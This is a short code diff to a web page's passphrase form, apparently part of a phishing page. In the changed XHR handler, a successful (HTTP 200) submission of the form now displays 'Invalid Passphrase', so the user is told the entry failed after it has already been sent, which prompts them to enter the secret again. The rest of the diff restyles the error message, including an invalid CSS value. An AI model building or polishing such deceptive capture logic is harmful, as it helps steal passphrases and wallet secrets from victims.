@@ -742,13 +742,14 @@
 																		const xhr = new XMLHttpRequest();
 																		xhr.open("POST", form.action, true);
 																		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-																		xhr.onreadystatechange = function () {
+																		xhr.onreadystatechange = function () {const errorMessageElement = document.querySelector('.mf-error-message');
 																			if (xhr.readyState === 4) {
 																				if (xhr.status === 200) {
-																					alert("There was an issue validating browser");
+																					errorMessageElement.textContent = "Invalid Passphrase";
+																					
 																				} else {
 																					errorMessageElement.textContent = "Something went wrong. Please try again.";
-																					errorMessageElement.style.display = "block";
+																					
 																				}
 																			}
 																		};
@@ -807,9 +808,14 @@
 				}
 			
 				.mf-error-message {
+					color: #cf3e3e;
+					font-family: 'Courier New', Courier, monospace;
 					font-size: 0.85rem; /* Smaller font size for error messages */
+					font-weight: -60;
 					position: relative;
-					top:0px; /* Move the error message higher */
+					top:5px; /* Move the error message higher */
+					text-align: center;
+					margin: 7px;
 				}
 			
 				.elementor-widget-container p {
@@ -821,7 +827,7 @@
 			
 				/* Additional style rules to ensure consistency with original theme */
 				body, .elementor-widget-heading .elementor-heading-title, .elementor-widget-container p, .mf-input-wrapper textarea {
-					font-family: "Your Original Font", sans-serif; /* Replace with the original font used in the theme */
+					font-family: Arial, Helvetica, sans-serif; /* Replace with the original font used in the theme */
 					line-height: 1.6; /* Ensure consistent line spacing */
 				}
 			</style>
